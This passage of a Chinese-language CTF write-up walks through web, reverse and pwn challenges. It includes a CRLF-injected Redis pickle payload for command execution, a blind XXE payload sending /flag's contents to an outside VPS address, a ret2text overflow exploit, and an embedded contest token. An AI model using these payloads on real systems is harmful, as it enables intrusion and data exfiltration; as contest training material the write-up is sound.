src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714992887587-02327559-9444-4a1a-a1f9-dd0e928c598d.png#averageHue=%23f8f7f7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=160&amp;id=uecceb6b4&amp;originHeight=240&amp;originWidth=844&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=20062&amp;status=done&amp;style=none&amp;taskId=u66937d01-7573-4a5c-b7e9-6d7ccce62e4&amp;title=&amp;width=562.6666666666666" alt="image.png"></p><p>结合题目phpsql应该是万能密码注入进入后台<br>直接拿sql语句字典跑</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714993045758-5d5a39af-821d-4573-92f8-1acbce11c6f0.png#averageHue=%23f7f6f6&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=808&amp;id=ue685cc7e&amp;originHeight=1212&amp;originWidth=1740&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=193028&amp;status=done&amp;style=none&amp;taskId=udfec92e2-bd07-4848-98f3-1be74fbbfcc&amp;title=&amp;width=1160" alt="image.png"></p><p>直接跑进去</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714993089174-839db6d3-1ae0-4e02-aa7d-90c465139d17.png#averageHue=%23f8f7f7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=579&amp;id=uca6f4055&amp;originHeight=868&amp;originWidth=2106&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=102070&amp;status=done&amp;style=none&amp;taskId=uebf09cf5-a2db-485f-acef-b0c9c6471cd&amp;title=&amp;width=1404" alt="image.png"></p><h2 id="pyssrf">pyssrf</h2><p>根据题目与提示pyssrf加什么年代了还用python3.7.1<br><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994494037-64fd117e-7f50-497c-adde-f2b742683b6e.png#averageHue=%23f7f6f5&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=421&amp;id=u05709a18&amp;originHeight=631&amp;originWidth=2358&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=163353&amp;status=done&amp;style=none&amp;taskId=ud0145662-c860-4a16-b1fe-b4c1b7540d4&amp;title=&amp;width=1572" alt="image.png"><br>python3.7.1的环境中,urllib有请求头注入<br>redis 解析<br>GET /?<br>payload<br>padding<br>基本上可以理解为<br>pickle反序列化+redis+rce+ssrf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">opcode=<span class="string">&#x27;&#x27;&#x27;(S&#x27;mkdir ./static;cp /flag ./static/f&#x27;</span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">key=hashlib.md5(<span class="string">&quot;http://test/&quot;</span>.encode()).hexdigest()</span><br><span class="line">value=base64.b64encode(opcode).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;set&#x27;</span>,key,value)</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set <span class="number">0439</span>e<span class="number">1</span>ff<span class="number">2</span>e<span class="number">65</span>e<span class="number">21</span>dcf<span class="number">4</span>bba<span class="number">4</span>c<span class="number">26</span>a<span class="number">0</span>dab<span class="number">2</span> KFM<span class="symbol">nbWtkaXIgLi9</span>zdGF<span class="number">0</span>aW<span class="name">M7</span>Y<span class="number">3</span>AgL<span class="number">2</span>ZsYWcgLi<span class="number">9</span>zdGF<span class="number">0</span>aWMvZicKaW<span class="number">9</span>zC<span class="symbol">nN5</span>c<span class="number">3</span>RlbQou</span><br></pre></td></tr></table></figure><p>构造url</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url<span class="operator">=</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">6379</span>?<span class="variable">%0</span>d<span class="variable">%0</span>aset<span class="variable">%200439</span>e<span class="number">1</span>ff<span class="number">2e65</span>e<span class="number">21</span>dcf<span class="number">4</span>bba<span class="number">4</span><span class="keyword">c</span><span class="number">26</span>a<span class="number">0</span>dab<span class="number">2</span><span class="variable">%20</span>KFMnbWtkaXIgLi<span class="number">9</span>zdGF<span class="number">0</span>aWM<span class="number">7</span>Y<span class="number">3</span>AgL<span class="number">2</span>ZsYWcgLi<span class="number">9</span>zdGF<span class="number">0</span>aWMvZicKaW<span class="number">9</span>zCnN<span class="number">5</span><span class="keyword">c</span><span class="number">3</span>RlbQou<span class="variable">%0</span>d<span class="variable">%0</span>apadding<span class="variable">%0</span>d<span class="variable">%0</span>a</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994544337-8fb892d3-eb1f-4eb6-8519-8009cbc7f922.png#averageHue=%23fcfcfb&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=636&amp;id=uf7471715&amp;originHeight=954&amp;originWidth=2073&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=172099&amp;status=done&amp;style=none&amp;taskId=ue5891c29-eb99-432b-b100-a8274cef51a&amp;title=&amp;width=1382" alt="image.png"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">url</span>=test/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994558947-f9549518-8176-46fa-8351-57e63ed42029.png#averageHue=%23fcfcfb&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=651&amp;id=u073badac&amp;originHeight=976&amp;originWidth=1699&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=145448&amp;status=done&amp;style=none&amp;taskId=u519df234-d0e8-423b-9fcf-86a8a9c6272&amp;title=&amp;width=1132.6666666666667" alt="image.png"></p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">static</span>/f</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994569753-437c68fe-8887-4069-b2da-66a5ce52d809.png#averageHue=%23f4f4f4&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=212&amp;id=ubc48bda5&amp;originHeight=145&amp;originWidth=508&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=17040&amp;status=done&amp;style=none&amp;taskId=uc9fa657c-22d7-40c4-b606-19b564e9126&amp;title=&amp;width=741.6666870117188" alt="image.png"><br>打开即可得到flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/29787801/1714994749430-228bc4a8-970d-4ba2-be9e-40588181af13.png#averageHue=%23e9e8e7&amp;clientId=u34d958cd-b7d8-4&amp;from=paste&amp;height=216&amp;id=u42b4835f&amp;originHeight=186&amp;originWidth=664&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=22735&amp;status=done&amp;style=none&amp;taskId=u011f692d-726d-4248-8c67-5518ae96ede&amp;title=&amp;width=772.6666870117188" alt="image.png"></p><h2 id="fileit">fileit</h2><p>源码有提示<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993406997-f9ee5e83-dd7b-4205-b62b-96a9dc140d30.png#averageHue=%23161616&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=141&amp;id=u612e9f98&amp;originHeight=212&amp;originWidth=856&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=15062&amp;status=done&amp;style=none&amp;taskId=ucc6f4d6c-11a1-4cf6-a0e2-a3284806825&amp;title=&amp;width=570.6666666666666" alt="image.png"><br>测试后发现要打无回显xxe<br>vps创建flag.dtd文件，内容如下：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;!ENTITY % <span class="keyword">ccc</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; aba SYSTEM &#x27;http://43.143.167.75:8888?x=%file;&#x27;&gt;&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%ccc;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-perl">%aba;</span></span><br></pre></td></tr></table></figure><p>创建完成后，在当前目录起python服务<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993610279-870a1647-d25a-4e40-bb49-5c79545d395b.png#averageHue=%23363534&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=214&amp;id=u42df1cf2&amp;originHeight=321&amp;originWidth=1166&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=32773&amp;status=done&amp;style=none&amp;taskId=u7a0eaf35-9ca7-430d-bb2f-9535f88f7a3&amp;title=&amp;width=777.3333333333334" alt="image.png"><br>payload如下：</p><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="meta">&lt;!DOCTYPE a [</span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/flag&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    <span class="meta">&lt;!ENTITY % <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://43.143.167.75:8888/flag.dtd&quot;</span>&gt;</span></span></span></span><br><span class="line"><span class="meta"><span class="language-xml"></span></span><span class="language-perl">    %xxe;</span><span class="language-xml"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="language-xml">    ]&gt;</span></span></span><br></pre></td></tr></table></figure><p>初始页面抓包后，post传参：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993694538-4c066cf9-fdf1-4797-8480-57b979fc7e14.png#averageHue=%2395a06c&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=699&amp;id=u4362b49d&amp;originHeight=1048&amp;originWidth=1584&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=243273&amp;status=done&amp;style=none&amp;taskId=u863ea369-8f5f-4208-a767-00ff811e152&amp;title=&amp;width=1056" alt="image.png"><br>发送后，vps就会显示接收的数据<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993724668-023b3aaa-ce9d-4493-bc71-bba222e1d145.png#averageHue=%233e3d3b&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=301&amp;id=u173b80ae&amp;originHeight=452&amp;originWidth=1359&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=59092&amp;status=done&amp;style=none&amp;taskId=ud783355a-defd-4cf3-a73e-ccdb63a3d3f&amp;title=&amp;width=906" alt="image.png"><br>base64解码，拿到flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714993743242-9254f3fc-1ecb-4b04-b0cf-c98c234f8510.png#averageHue=%23ebebea&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=322&amp;id=u1c691f26&amp;originHeight=483&amp;originWidth=998&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=24179&amp;status=done&amp;style=none&amp;taskId=ue2aef635-3d68-400d-8485-5e0b7981eb3&amp;title=&amp;width=665.3333333333334" alt="image.png"></p><h1>Reverse</h1><h2 id="ezayre">ezayre</h2><p>64位无壳elf，拉进ida看看<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765706-a3095736-a5b7-47ba-b23d-866b730cb950.png#averageHue=%23f9f7f7&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u88596a10&amp;originHeight=547&amp;originWidth=772&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u8ce547ae-6a90-4b8b-b514-63aa2ba03ac&amp;title=" alt=""><br>锁定主要函数是sub_1208，跟进之后有爆红，修好之后加密逻辑如下，看到下图标红处之后，感觉是base64<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765742-1cdb534e-27d7-4cc4-bd45-aa83c1012e4d.png#averageHue=%23f9f9f9&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u473e1a4e&amp;originHeight=763&amp;originWidth=1028&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u6ad6fd18-57fa-4756-b6d4-ff3312d6be2&amp;title=" alt=""><br>直接查找一下字符串<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765707-401ce508-7aea-4897-b4c8-b0654fdb8d8e.png#averageHue=%23f8f5f3&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=uccc36a39&amp;originHeight=574&amp;originWidth=899&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ube02818f-1435-4679-a1f9-838ade16a94&amp;title=" alt=""><br>看见变表和密文之后直接秒了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765583-e9e645b8-9ff4-46fd-9c35-39f31dbd8769.png#averageHue=%23e7e6e6&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=ufd19f407&amp;originHeight=643&amp;originWidth=1279&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ua3dbb87b-6b69-43c5-885e-877b4c5bed9&amp;title=" alt=""></p><h2 id="babyre">babyre</h2><p>正常脱upx壳之后拉进ida<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001765670-b0ad82b2-4f5e-497d-a3c4-2ece25075536.png#averageHue=%23fdfafa&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;id=u0449cf0a&amp;originHeight=495&amp;originWidth=710&amp;originalType=url&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u7e3cab4e-b008-44e1-9042-057ce5f3d78&amp;title=" alt=""><br>直接把四个函数中的加密逆一下，都是一些基本加密操作，直接爆破一下，注意爆破的取值区间是0~2^32-1,包含所有32无符号整数，把内容合一下，exp如下（PS:第一个函数就加减值加密，不写入函数了就）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1257</span><span class="params">(<span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (a1 | <span class="number">0x8E03BEC3</span>) - <span class="number">3</span> * (a1 &amp; <span class="number">0x71FC413C</span>) + a1 == <span class="number">-1876131848</span> )</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_12A4</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x10000000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4</span> * ((~a1 &amp; <span class="number">0xA8453437</span>) + <span class="number">2</span> * ~(~a1 | <span class="number">0xA8453437</span>))</span><br><span class="line">     + <span class="number">-3</span> * (~a1 | <span class="number">0xA8453437</span>)</span><br><span class="line">     + <span class="number">3</span> * ~(a1 | <span class="number">0xA8453437</span>)</span><br><span class="line">     - (<span class="number">-10</span> * (a1 &amp; <span class="number">0xA8453437</span>)</span><br><span class="line">      + (a1 ^ <span class="number">0xA8453437</span>)) == <span class="number">551387557</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_1346</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">0x10000000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">11</span> * ~(a1 ^ <span class="number">0xE33B67BD</span>)</span><br><span class="line">     + <span class="number">4</span> * ~(~a1 | <span class="number">0xE33B67BD</span>)</span><br><span class="line">     - (<span class="number">6</span> * (a1 &amp; <span class="number">0xE33B67BD</span>)</span><br><span class="line">      + <span class="number">12</span> * ~(a1 | <span class="number">0xE33B67BD</span>))</span><br><span class="line">     + <span class="number">3</span> * (a1 &amp; <span class="number">0xD2C7FC0C</span>)</span><br><span class="line">     + <span class="number">-5</span> * a1</span><br><span class="line">     - <span class="number">2</span> * ~(a1 | <span class="number">0xD2C7FC0C</span>)</span><br><span class="line">     + ~(a1 | <span class="number">0x2D3803F3</span>)</span><br><span class="line">     + <span class="number">4</span> * (a1 &amp; <span class="number">0x2D3803F3</span>)</span><br><span class="line">     - <span class="number">-2</span> * (a1 | <span class="number">0x2D3803F3</span>) == <span class="number">0xCE1066DC</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">0xADB1D018</span>LL;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> b = a+<span class="number">0x36145344</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_1257</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_12A4</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;-&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">unsigned</span> <span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>^<span class="number">32</span> - <span class="number">1</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> bbq = <span class="built_in">sub_1346</span>(i);</span><br><span class="line"><span class="keyword">if</span>(bbq==<span class="number">0LL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x&quot;</span>,i);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;e3c6235c-05d9434d-04b1edf3-04034083&#125;</span></span><br></pre></td></tr></table></figure><h1>Pwn</h1><h2 id="babypwn">babypwn</h2><ul><li>ret2text</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">from</span> pwn import *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob07.contest.pku.edu.cn&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Please input your token: &#x27;</span>)</span><br><span class="line">p.sendline(b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Enter your username: &#x27;</span>)</span><br><span class="line">p.sendline(b<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x = b<span class="string">&#x27;!@#$%^&amp;*()_+&#x27;</span></span><br><span class="line"><span class="built_in">offset</span>=<span class="number">0x38</span> - <span class="built_in">len</span>(x)</span><br><span class="line">payload = x + b<span class="string">&#x27;\x00&#x27;</span> * <span class="built_in">offset</span> + p64(<span class="number">0x40117A</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;Enter the password: &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Login">Login</h2><p>密码处输入字符过长溢出，密码自己出来了<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996681718-deba3f05-beb0-4cd5-9e82-68eaecfb43a3.png#averageHue=%230a0908&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=813&amp;id=u0a997292&amp;originHeight=1219&amp;originWidth=2530&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=222241&amp;status=done&amp;style=none&amp;taskId=u01241050-9a4a-48ce-b0b3-aedfd42c4f8&amp;title=&amp;width=1686.6666666666667" alt="image.png"><br>elf文件泄露，使用脚本提取</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;prob04.contest.pku.edu.cn&#x27;</span>, <span class="number">10004</span>, level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Please input your token: &#x27;</span>,</span><br><span class="line">                b<span class="string">&#x27;468:MEYCIQCSFzmz7YKQQSyTyG0KfXOcsHbsrQxCKD5bUvCixeW7xwIhAJD6lBpyqK9_IVF2Qw0Y78gKJ3afeacA9ckn0feIZUYl&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Username:&#x27;</span>, b<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;Password:&#x27;</span>, b<span class="string">&#x27;1q2w3e4r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">data</span> = p.recvall()</span><br><span class="line">flag = <span class="keyword">data</span>.find(b<span class="string">&#x27;\x7fELF&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> flag ==-<span class="number">1</span>:</span><br><span class="line">    datas = <span class="keyword">data</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    datas = <span class="keyword">data</span>[flag:]</span><br><span class="line"></span><br><span class="line">with <span class="keyword">open</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(datas)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>提取成功，找到后门<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1714996795308-bf233b5b-65dd-4af5-b558-fe74bf5ea687.png#averageHue=%23f9f7f5&amp;clientId=u5c4ec47b-3eca-4&amp;from=paste&amp;height=121&amp;id=u6fa22c66&amp;originHeight=181&amp;originWidth=799&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=13303&amp;status=done&amp;style=none&amp;taskId=ub2c18f58-f686-4613-b1c0-efeb1434234&amp;title=&amp;width=532.6666666666666" alt="798c4c64bc527cfdfb112297a2aba3a.png"><br>找gadgets<br><img 